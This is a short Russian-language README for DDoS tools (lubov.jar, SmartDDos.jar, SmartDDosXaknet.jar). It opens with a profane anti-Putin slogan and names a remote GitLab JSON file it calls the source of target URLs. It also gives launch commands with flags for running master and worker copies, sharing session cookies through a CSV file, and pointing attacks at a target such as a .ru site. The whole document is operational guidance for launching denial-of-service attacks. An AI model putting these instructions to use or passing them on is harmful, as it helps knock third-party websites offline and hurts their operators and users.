# Путин Хуйло!

Для работы утилиты нужно установить джаву!

Команда запуска в консоле

```
windows cmd -> java -jar bin/lubov.jar
mac os/linux terminal  -> java -jar bin/lubov.jar
```

`https://gitlab.com/cto.endel/atack_api/-/raw/master/sites.json` - источник урлов

Приложение перечитывает URLs каждые 10 мин

### SmartDDosXaknet.jar
Используйте -Dmaster=true для запуска первой копии и ручной авторизации
Используйте -Dmaster=false для запуска следующих копий, которые будут считывать куки из файла
Используйте -Dfile=/cookie.csv путь к файлу с куками
java -Dmaster=false -Dfile=/cookie.csv -jar SmartDDosXaknet.jar

### SmartDDos.jar
Используйте -Dmaster=true для запуска первой копии и ручной авторизации
Используйте -Dmaster=false для запуска следующих копий, которые будут считывать куки из файла
Используйте -Dfile=cookie.csv путь к файлу с куками
Используйте -Dtarget=http://target.ru цель для аттаки
java -Dmaster=false -Dtarget=http://target.ru -Dfile=/cookie.csv -jar SmartDDos.jar